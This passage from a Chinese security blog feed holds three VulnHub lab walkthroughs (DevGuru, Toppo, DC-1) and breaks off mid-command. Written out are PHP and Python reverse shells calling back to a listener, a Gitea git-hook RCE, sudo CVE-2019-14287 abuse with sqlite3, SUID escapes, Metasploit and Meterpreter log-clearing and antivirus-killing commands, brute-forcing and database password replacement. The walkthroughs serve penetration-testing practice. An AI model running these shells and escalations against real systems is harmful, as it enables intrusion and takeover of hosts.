        <content type="html"><![CDATA[<p>靶机地址<a href="https://www.vulnhub.com/entry/devguru-1,620/">devguru</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规扫描</p><p><code>sudo nmap 192.168.1.0/24 -sn</code>靶机发现192.168.1.138</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png"></p><p><code>sudo nmap $ip -p- --min-rate=10000</code>端口扫描22,80,8585</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png"></p><p><code>sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru/detail</code>细节扫描，tcp协议扫描对应端口，-sC使用默认脚本，-SV扫描版本信息，-O确定操作系统，-oA格式化输出</p><p> <img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png"></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png"></p><p>80端口存在git泄露，8585端口运行了gitea</p><p><code>sudo nmap -sU --top-ports 20 $ip -oA devguru/udp</code>扫描udp的常见端口，有时可以多指定一些端口</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png" alt="enter description here"></p><p>目录扫描，有时一个工具没有收获可以多试试几个工具（如dirb，dirsearch，gobuster等）</p><p>80端口目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png"></p><p>8585端口的目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png" alt="enter description here"></p><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>80端口存在git泄露，使用githack工具下载下来</p><p><code>sudo python GitHack.py http://192.168.1.138</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png"></p><p>重点查看配置相关文件</p><p>config下的database.php发现数据库信息</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png"></p><p>访问80端口的adminer.php发现是数据库管理</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png"></p><p>使用刚刚获取的信息登录</p><p>优先关注users等信息，只找到一个backend_users的表，此时有两个思路，1修改原来管理员的密码，危险程度较高，容易被发现，2是新建一个用户，危险程度较低，这里选择新建用户<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png" alt="enter description here"></p><p>最后is_superuser要设置为1，在用户组将我们新建的用户归类到管理员组</p><p>同时根据数据库加上80端口扫描的目录backend,访问并登录</p><p>登录之后在cms -add - code输入反弹shell的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStart()&#123;</span><br><span class="line">//nc监听7777端口</span><br><span class="line">    $s   =fsockopen(&quot;192.168.1.114&quot;,5555);</span><br><span class="line">    $proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png"></p><p>同时开启本地监听<code>nc -lvvp 5555</code></p><p>访问&#x2F;home1（新建网页名称）执行代码获取shell</p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="获取高交互shell"><a href="#获取高交互shell" class="headerlink" title="获取高交互shell"></a>获取高交互shell</h3><p>使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获得交互更好的shell（使用什么版本的python主要看环境有什么版本）</p><p>读取&#x2F;etc&#x2F;passwd文件发现只有root和frank用户有&#x2F;bin&#x2F;bash即允许ssh且有高交互shell</p><p>尝试读取shadow文件权限不允许，通常shadow文件都是只有root用户有权限的，但是也不一定，如果可以读取就可以利用该文件进行hash碰撞</p><p>使用python启动一个快速http服务共享文件<code>python -m http.server</code></p><p>使用wget下载linpeas.sh和LinEnum.sh</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png"></p><p>提升权限并运行脚本</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png"></p><p>suid不存在提权，看看sudo，需要密码，无法获得</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png"></p><p>查看备份文件<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png"></p><h3 id="获取普通用户"><a href="#获取普通用户" class="headerlink" title="获取普通用户"></a>获取普通用户</h3><p>发现新的服务器连接<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png" alt="enter description here"></p><p>同样查看user，因为我们已经获取了web的权限，因此这里我们想要获取frank用户的权限，所以这里的选择是更改frank的密码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png" alt="enter description here"></p><p>原来的gitea的加密方式是pbkdf2且有salt，我们选择换一个加密方式，bcrypt，使用网站实现（我这里尝试了几种方式，只有bcrypt可行，有的博客使用了原加密方式，但没说清楚salt值的获取）<a href="https://www.bejson.com/encrypt/bcrpyt_encode/#google_vignette">在线Bcrypt密码生成工具-Bejson.com</a></p><p><code>$2a$10$sV1DF9po/5T1BE2dsy2OueGZ/VuPrUrwDR6aA88Ygu2gv6GPeGtzO</code></p><p>结合目录扫描的结构gitea在8585端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png" alt="enter description here"></p><p>左下角显示gitea的版本是1.12.5</p><p>该版本存在以下漏洞</p><p>setting -&gt; git hook输入命令</p><p>然后编辑 readme.md 随便编辑即可执行<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png"></p><p>成功拿到<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png"></p><p>存在sqlite3无需密码使用<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png"></p><h2 id="sqlite3配合sudo漏洞提权"><a href="#sqlite3配合sudo漏洞提权" class="headerlink" title="sqlite3配合sudo漏洞提权"></a>sqlite3配合sudo漏洞提权</h2><p>发现特权命令&#x2F;usr&#x2F;bin&#x2F;sqlite3使用网站查找<a href="https://gtfobins.github.io/">GTFOBins</a></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png"></p><p>复制，执行，发现</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png"></p><p>sudo的版本是1.8.21，存在一个<a href="https://www.freebuf.com/vuls/217089.html">CVE-2019-14287：sudo权限绕过漏洞分析与复现 - FreeBuf网络安全行业门户</a>的漏洞</p><p>这里可以使用该漏洞配合sqlite3提权</p><p><code>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> web渗透 </tag>
            
            <tag> vulnhub靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>suid提权实战 Toppo</title>
      <link href="/2025/04/27/suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98%20Toppo/"/>
      <url>/2025/04/27/suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98%20Toppo/</url>
      
        <content type="html"><![CDATA[<p>靶场地址</p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>常规扫描查找ip端口及服务等信息</p><p><code>sudo nmap 192.168.1.0/24 -sn</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061805571.png"></p><p>同时嗅探udp协议的端口开放情况并留档</p><p><code>sudo nmap 192.168.1.113 -sU --top-ports 20 -oA nmapscan/udp</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061924349.png"></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061937852.png"></p><p>处理端口<code>ports=$(grep open Toppo/nmapscan/ports.nmap| awk -F &#39;/&#39; &#39;&#123;print $1&#125;&#39; | paste -sd &#39;,&#39;)</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061958522.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062037505.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061988169.png"></p><p>使用脚本扫描时发现一些有趣的目录</p><h2 id="2-开始渗透"><a href="#2-开始渗透" class="headerlink" title="2.开始渗透"></a>2.开始渗透</h2><p>在80端口的admin目录下发现文件</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062054150.png"></p><p>打开之后发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note to myself :</span><br><span class="line"></span><br><span class="line">I need to change my password :/ 12345ted123 is too outdated but the technology isn&#x27;t my thing i prefer go fishing or watching soccer .</span><br></pre></td></tr></table></figure><p>将<code>12345ted123,12345,ted,ted123</code>写到pass.txt文件里用于爆破ssh登录，这种比较短的情况也可以手动测试</p><p>使用字典时LP用大写，确定的参数时用小写 如<code>hydra -l ted -P pass.txt ssh://ip</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062072346.png"></p><p>将要使用的linpeas.sh脚本传上去方便利用</p><p><code>scp /home/kali/linpeas.sh ted@192.168.1.113:/tmp/1.sh</code></p><h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3. 权限提升"></a>3. 权限提升</h2><p>ssh连接之后提权并运行脚本<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062086685.png"></p><p>发现可以用mawk和python2.7</p><p>到<a href="https://gtfobins.github.io/">GTFOBINS</a>上搜索利用方式</p><h3 id="mawk提权"><a href="#mawk提权" class="headerlink" title="mawk提权"></a>mawk提权</h3><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062194189.png"></p><p>我们先试试该语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mawk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;</span><br><span class="line">显示sudo未找到，我们再试试</span><br><span class="line">mawk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;</span><br><span class="line">发现成功提权</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062206955.png"></p><h3 id="python提权"><a href="#python提权" class="headerlink" title="python提权"></a>python提权</h3><p>使用python反弹shell</p><p>在kali机上监听5555端口<code>nc -lvvp 5555</code></p><p>在靶机上运行<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>生成的脚本</p><p>这里的python要使用python2.7或者&#x2F;usr&#x2F;bin&#x2F;python2.7 最好和suid里发现的一致</p><p><code>/usr/bin/python2.7 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.114&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062226209.png"></p><p>提权成功</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><strong>后记</strong>：将&#x2F;etc&#x2F;shadow文件保存下来之后用john碰撞发现root的密码就是test123<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747062241732.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> vulnhub靶场 </tag>
            
            <tag> 靶场实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战  DC</title>
      <link href="/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/"/>
      <url>/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/</url>
      
        <content type="html"><![CDATA[<p>地址<a href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></p><h2 id="0-题外话，虚拟机网络设置"><a href="#0-题外话，虚拟机网络设置" class="headerlink" title="0.题外话，虚拟机网络设置"></a>0.题外话，虚拟机网络设置</h2><p>安装不必多说，使用桥接模式即可（如果是校园网之类环境可能导致桥接扫不到目标靶机，可以在物理机上新建一个本地回环的虚拟网卡</p><p>win+x打开设备管理器，-&gt;操作-&gt;添加过时的硬件-&gt;安装我手动选择的（高级）-&gt;网络适配器-&gt;厂商（Microsoft）型号（Microsoft KM-TEST环回适配器）</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060249258.png"></p><p>然后找到高级网络设置，将我们新添加的网卡改名虚拟机（方便找）</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060264822.png"></p><p>然后在连接网络的网卡上选择更多，共享，按照如图设置</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060275575.png"></p><p>最后在选择虚拟机的网卡时选择我们刚刚设置的网卡，即可在物理机和虚拟机小范围使用局域网）</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060366887.png"></p><h2 id="1-正式开始"><a href="#1-正式开始" class="headerlink" title="1.正式开始"></a>1.正式开始</h2><p>使用nmap简单扫描，<code>-sn</code>是Nmap的<strong>主机发现扫描模式</strong>，主要用于探测目标主机是否在线，而不会执行端口扫描。其核心特点包括：<strong>作用</strong>：通过发送ICMP Echo请求（ping）、TCP SYN到80端口、TCP ACK到80端口等组合探测包，判断目标主机是否存活。</p><p>其他常用nmap指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1\. 端口扫描参数</span><br><span class="line">-sS（TCP SYN扫描）</span><br><span class="line">特点：半开放扫描，仅发送SYN包，不完成TCP三次握手，速度快且隐蔽性强。</span><br><span class="line">适用场景：需要快速扫描且避免被防火墙记录的场景，需管理员权限（如Linux的sudo） 。</span><br><span class="line">-sT（TCP全连接扫描）</span><br><span class="line">特点：完成TCP三次握手，准确性高但速度较慢，易被日志记录。</span><br><span class="line">适用场景：无管理员权限时的默认TCP扫描方式 。</span><br><span class="line">-sU（UDP扫描）</span><br><span class="line">特点：检测UDP端口状态，速度较慢且可靠性低（UDP无连接状态）。</span><br><span class="line">适用场景：探测DNS、SNMP等UDP服务 。</span><br><span class="line">2\. 服务与版本探测 -sV</span><br><span class="line">作用：识别开放端口上的服务及其版本信息。</span><br><span class="line">示例：nmap -sV 192.168.1.1会显示端口的服务名称和版本号 。</span><br><span class="line">-A（全面扫描）</span><br><span class="line">功能：启用操作系统检测（-O）、版本探测（-sV）、脚本扫描（-sC）和路由追踪（--traceroute）。</span><br><span class="line">适用场景：全面渗透测试，需详细目标信息 。</span><br><span class="line">3\. 操作系统检测  -O</span><br><span class="line">作用：基于TCP/IP协议栈指纹猜测目标操作系统。</span><br><span class="line">增强选项：--osscan-limit和--osscan-guess可提高准确性 。</span><br><span class="line">4\. 扫描速度与隐蔽性</span><br><span class="line">-T&lt;0-5&gt;（时间模板）</span><br><span class="line">推荐：-T4（快速模式）平衡速度与准确性；-T5（疯狂模式）牺牲准确性换速度，适合高性能网络 。</span><br><span class="line">-f（分片）与-D（诱饵IP）。</span><br><span class="line">5\. 输出格式</span><br><span class="line">-oN/-oX/-oG</span><br><span class="line">功能：分别输出普通文本、XML格式和Grep友好格式，便于后续分析 。</span><br><span class="line">6\. 脚本引擎</span><br><span class="line">--script</span><br><span class="line">功能：调用Nmap脚本引擎（NSE）执行漏洞检测或自动化任务。</span><br><span class="line">示例：--script=vuln检测常见漏洞，--script=whois-domain查询域名信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数选择策略</span><br><span class="line">快速主机发现：-sn + -T4，例如nmap -sn -T4 192.168.1.0/24。</span><br><span class="line">详细端口扫描：-sS（SYN扫描） + -sV + -O，例如nmap -sS -sV -O 192.168.1.1。</span><br><span class="line">绕过防火墙：-sS + -f + --script=firewall-bypass。</span><br><span class="line">全面渗透测试：-A + -p-（全端口） + -T4，例如nmap -A -p- -T4 192.168.1.1。</span><br></pre></td></tr></table></figure><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060328621.png"></p><p>192.168.1.112为新出现的ip，应该就是我们的目标靶机</p><p>直接上用全面测试看一下端口开放情况<code>nmap 192.168.1.112 -A -p-</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060381092.png"></p><p>通常22端口的ssh一般是没有利用点的，所以一般渗透时通常查看的是80端口的网页或者其他端口开放的网页，这里可以看到80端口有一个drupal的框架，使用–script&#x3D;vuln扫描时也可以看到有较多漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 192.168.1.112 -p22,80,111,43014 --script=vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 07:38 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.74% done; ETC: 07:40 (0:00:00 remaining)                                                                                             </span><br><span class="line">Nmap scan report for 192.168.1.112                                                                                                                        </span><br><span class="line">Host is up (0.00096s latency).                                                                                                                            </span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE                                                                                                                                   </span><br><span class="line">22/tcp    open  ssh                                                                                                                                       </span><br><span class="line">80/tcp    open  http                                                                                                                                      </span><br><span class="line">| http-vuln-cve2014-3704:                                                                                                                                 </span><br><span class="line">|   VULNERABLE:                                                                                                                                           </span><br><span class="line">|   Drupal - pre Auth SQL Injection Vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-3704</span><br><span class="line">|         The expandArguments function in the database abstraction API in</span><br><span class="line">|         Drupal core 7.x before 7.32 does not properly construct prepared</span><br><span class="line">|         statements, which allows remote attackers to conduct SQL injection</span><br><span class="line">|         attacks via an array containing crafted keys.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2014-10-15</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.drupal.org/SA-CORE-2014-005</span><br><span class="line">|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</span><br><span class="line">|       http://www.securityfocus.com/bid/70595</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.112</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/node?destination=node</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/password</span><br><span class="line">|     Form id: user-pass</span><br><span class="line">|     Form action: /user/password</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/register</span><br><span class="line">|     Form id: user-register-form</span><br><span class="line">|     Form action: /user/register</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|     Form action: /user</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.1.112:80/user/</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|_    Form action: /user/</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /rss.xml: RSS or Atom feed</span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README: Interesting, a readme.</span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /0/: Potentially interesting folder</span><br><span class="line">|_  /user/: Potentially interesting folder</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">43014/tcp open  unknown</span><br><span class="line">MAC Address: 08:00:27:FE:29:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 255.85 seconds</span><br></pre></td></tr></table></figure><h2 id="3-目标渗透"><a href="#3-目标渗透" class="headerlink" title="3.目标渗透"></a>3.目标渗透</h2><p>扫到这些东西平时都是要查看一下的，今天这个简单靶场我们直接用exp打进去即可</p><p>使用msfconsole查看drupal相关exp直接打试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf常用命令</span><br><span class="line">search &lt;关键词&gt;：搜索漏洞模块（如search ms17_010） </span><br><span class="line">use &lt;模块路径&gt;：加载模块（如use exploit/windows/smb/ms17_010_eternalblue） </span><br><span class="line">show options：查看当前模块需配置的参数 </span><br><span class="line">set &lt;参数名&gt; &lt;值&gt;：设置参数（如set RHOST 192.168.1.1;set rports 8080;端口80时可缺省） </span><br><span class="line">exploit或run：执行攻击</span><br></pre></td></tr></table></figure><ul><li><p>Meterpreter后渗透命令</p><ul><li><p>文件与系统操作</p><ul><li><p>upload &lt;本地文件&gt; &lt;目标路径&gt;：上传文件</p></li><li><p>download &lt;目标文件&gt;：下载文件</p></li><li><p>shell：进入目标命令行</p></li><li><p>screenshot：截取屏幕</p></li></ul></li><li><p>提权与信息收集</p><ul><li><p>getsystem：尝试提权至SYSTEM</p></li><li><p>hashdump：导出SAM哈希</p></li><li><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications：枚举安装的软件</p></li></ul></li><li><p>进程与网络管理</p><ul><li><p>ps：查看进程</p></li><li><p>migrate ：迁移进程（如迁移到explorer.exe）</p></li><li><p>portfwd add -l &lt;本地端口&gt; -p &lt;目标端口&gt; -r &lt;目标IP&gt;：端口转发</p></li></ul></li><li><p>隐蔽与清理</p><ul><li><p>clearev：清除事件日志</p></li><li><p>run killav：关闭杀毒软件</p></li></ul></li></ul></li></ul><p>查找drupal相关漏洞payload ，这里使用第一条，也可以具体指定<code>use exploit/unix/webapp/drupal_drupalgeddon2</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060418967.png"></p><p>设置靶机ip，由于端口是80端口可以不指定，直接使用run开始攻击</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060513419.png"></p><h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4.权限提升"></a>4.权限提升</h2><p>为了后续提权，我们将提权脚本上传到靶机tmp目录，使用linpeas.sh（可以直接到github搜索下载这个脚本）<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060522665.png"></p><p>执行这个脚本看看提权点（这里显示的权限还不够，最好直接chmod 777 1.sh完全提权）<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060561766.png"></p><p>在这里看到黄字标黄的find具备suid权限，可以使用suid提权<br>也可以使用<code>find / -perm -u=s 2&gt;/dev/null</code>来查找可以可能存在suid的命令，不过需要自己辨认一下。</p><p><code>find . / -exec &quot;/bin/sh&quot; \;</code>即可提权到root<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060584605.png"></p><h2 id="flag寻找"><a href="#flag寻找" class="headerlink" title="flag寻找"></a>flag寻找</h2><p>最后找一下这个靶场的flag文件</p><p>在&#x2F;var&#x2F;www目录下有flag1.txt读取为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure><p>提示我们要查找相关配置文件</p><p>drupal的默认配置文件为<code>/var/www/sites/default/settings.php</code></p><p>在该文件中发现flag2并提示我们要提升权限，同时我们在里面找到了数据库的信息<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060678290.png"></p><p>直接使用shell创建的shell不稳定，我们使用python反弹一个交互式的shell</p><p>反弹命令可以在<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>直接生成</p><p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.111&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>之后就可以登录mysql查看数据库<code>mysql -udbuser -pR0ck3t</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p>可以看到有admin用户，应该是网页的admin账号，这里密码是加密显示的，要么破解，要么使用相同的加密方式加密一个已知密码替换，drupal的加密方式为scripts下的password-hash.sh<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060695057.png"></p><p>因此我们在drupal目录下运行<code>php scripts/password-hash.sh 123456</code>即可生成123456的密文，替换进去即可</p><p><code>update users set 